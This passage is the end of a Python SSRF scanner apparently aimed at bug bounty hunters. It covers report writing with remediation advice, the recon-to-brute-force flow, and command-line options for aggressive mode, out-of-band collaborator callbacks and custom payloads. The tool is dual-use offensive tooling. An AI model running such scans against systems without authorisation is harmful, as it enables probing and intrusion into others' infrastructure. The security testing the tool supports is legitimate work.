        vulnerabilities_file = os.path.join(self.output_dir, f"ssrf_vulnerabilities_{self.domain.replace('://', '_').replace('.', '_')}.json")
        print(f"{SUCCESS} Detailed vulnerabilities saved to: {vulnerabilities_file}")
        
        return results
        
    def _save_results(self):
        """Save test results to JSON files"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        try:
            # Save vulnerabilities (suspicious results)
            if self.found_vulnerabilities:
                vulns_file = os.path.join(
                    self.output_dir, 
                    f"ssrf_vulnerabilities_{self.domain.replace('://', '_').replace('.', '_')}.json"
                )
                
                with open(vulns_file, 'w') as f:
                    json.dump(
                        [asdict(r) for r in self.found_vulnerabilities], 
                        f, 
                        indent=2
                    )
                
                # Generate a human-readable report
                report_file = os.path.join(
                    self.output_dir, 
                    f"ssrf_report_{self.domain.replace('://', '_').replace('.', '_')}.md"
                )
                
                with open(report_file, 'w') as f:
                    f.write(f"# SSRF Vulnerability Report for {self.domain}\n\n")
                    f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    f.write(f"## Summary\n\n")
                    f.write(f"- Target: {self.domain}\n")
                    f.write(f"- Total Suspicious Findings: {len(self.found_vulnerabilities)}\n\n")
                    
                    f.write(f"## Potential Vulnerabilities\n\n")
                    
                    # Group findings by URL
                    findings_by_url = {}
                    for vuln in self.found_vulnerabilities:
                        if vuln.url not in findings_by_url:
                            findings_by_url[vuln.url] = []
                        findings_by_url[vuln.url].append(vuln)
                    
                    # Write findings for each URL
                    for url, findings in findings_by_url.items():
                        f.write(f"### URL: `{url}`\n\n")
                        
                        for i, finding in enumerate(findings):
                            f.write(f"#### Finding {i+1}\n\n")
                            f.write(f"- Parameter: `{finding.param}`\n")
                            f.write(f"- Payload: `{finding.payload}`\n")
                            f.write(f"- Status Code: {finding.status_code}\n")
                            f.write(f"- Response Time: {finding.response_time}s\n")
                            f.write(f"- Content Length: {finding.content_length} bytes\n")
                            
                            if finding.headers_used:
                                f.write(f"- Headers Used: \n")
                                for header, value in finding.headers_used.items():
                                    f.write(f"  - `{header}: {value}`\n")
                            
                            if finding.evidence:
                                f.write(f"- Evidence: \n")
                                for evidence in finding.evidence:
                                    f.write(f"  - {evidence}\n")
                                    
                            if finding.error:
                                f.write(f"- Error: {finding.error}\n")
                                
                            f.write("\n")
                    
                    f.write(f"## Recommendations\n\n")
                    f.write("1. Validate and sanitize all URL parameters before use\n")
                    f.write("2. Implement allowlists for external domains\n")
                    f.write("3. Use internal DNS names that don't resolve externally\n")
                    f.write("4. Consider implementing a URL proxy service\n")
                    f.write("5. Block access to internal resources from public-facing applications\n")
            
            # Save full results periodically if needed
            # This is optional and can be resource-intensive for large scans
            if len(self.results) > 0 and random.random() < 0.1:  # 10% chance to save full results
                full_results_file = os.path.join(
                    self.output_dir, 
                    f"ssrf_full_results_{self.domain.replace('://', '_').replace('.', '_')}_{timestamp}.json"
                )
                
                # Get a sample of results to avoid extremely large files
                sample_size = min(5000, len(self.results))
                sampled_results = random.sample(self.results, sample_size)
                
                with open(full_results_file, 'w') as f:
                    json.dump(
                        [asdict(r) for r in sampled_results], 
                        f, 
                        indent=2
                    )
                
        except Exception as e:
            print(f"{ERROR} Error saving results: {e}")
        
    def run(self):
        """Main execution flow"""
        print(f"\n{SUCCESS} Starting SSRFuck Pro v2.0 on {self.domain}\n")
        
        # Step 1: Run recon to collect URLs
        urls = self.run_recon()
        
        if not urls:
            print(f"{ERROR} No URLs found during reconnaissance. Exiting.")
            return
        
        # Step 2: Filter URLs to keep only those with potential SSRF parameters
        ssrf_candidate_urls = self.filter_ssrf_urls(urls)
        
        if not ssrf_candidate_urls:
            print(f"{ALERT} No SSRF candidate URLs found. Testing a sample of all URLs.")
            # Test a sample of all URLs as fallback
            sample_size = min(50, len(urls))
            ssrf_candidate_urls = random.sample(urls, sample_size)
        
        # Step 3: Perform SSRF testing on the candidate URLs
        self.bruteforce_ssrf(ssrf_candidate_urls)


def main():
    """Main entry point with argument parsing"""
    parser = argparse.ArgumentParser(
        description=f"{Fore.GREEN}SSRFHunter Pro v2.0{Style.RESET_ALL} - Advanced SSRF Detection for Bug Bounty Hunters",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  {Fore.CYAN}Basic scan:{Style.RESET_ALL}
    python ssrfuck.py example.com
    
  {Fore.CYAN}With Burp Collaborator:{Style.RESET_ALL}
    python ssrfuck.py example.com --collaborator https://YOUR-ID.burpcollaborator.net
    
  {Fore.CYAN}Aggressive mode with proxy:{Style.RESET_ALL}
    python ssrfuck.py example.com --aggressive --proxy http://127.0.0.1:8080
    
  {Fore.CYAN}With custom cookies:{Style.RESET_ALL}
    python ssrfuck.py example.com --cookies "session=abc123; auth=token"
        
{Fore.YELLOW}Report bugs and contribute at: https://github.com/xOryus/ssrfuck/{Style.RESET_ALL}
"""
    )
    
    parser.add_argument("domain", help="Target domain to scan (e.g., example.com)")
    parser.add_argument("--proxy", help="Proxy for requests (e.g., http://127.0.0.1:8080)", default=None)
    parser.add_argument("--threads", type=int, help="Number of concurrent threads (default: 10)", default=10)
    parser.add_argument("--timeout", type=int, help="Request timeout in seconds (default: 10)", default=10)
    parser.add_argument("--output", help="Output directory for results (default: ./results)", default="./results")
    parser.add_argument("--cookies", help="Cookies to include with requests (format: 'name=value; name2=value2')", default=None)
    parser.add_argument("--no-verify-ssl", action="store_true", help="Disable SSL verification")
    parser.add_argument("--delay", type=float, help="Delay between requests in seconds (default: 0)", default=0)
    parser.add_argument("--max-urls", type=int, help="Maximum number of URLs to test (default: all)", default=None)
    parser.add_argument("--retries", type=int, help="Number of retries for failed requests (default: 2)", default=2)
    parser.add_argument("--aggressive", action="store_true", help="Enable aggressive testing (more payloads, headers)")
    parser.add_argument("--collaborator", help="Collaborator domain for OOB testing", default=None)
    parser.add_argument("--follow-redirects", action="store_true", help="Follow redirects (default: false)")
    parser.add_argument("--custom-payloads", help="Path to file with custom SSRF payloads (one per line)")
    
    args = parser.parse_args()
    
    # Run the scanner
    scanner = SSRFScanner(args)
    scanner.run()


if __name__ == "__main__":
    main()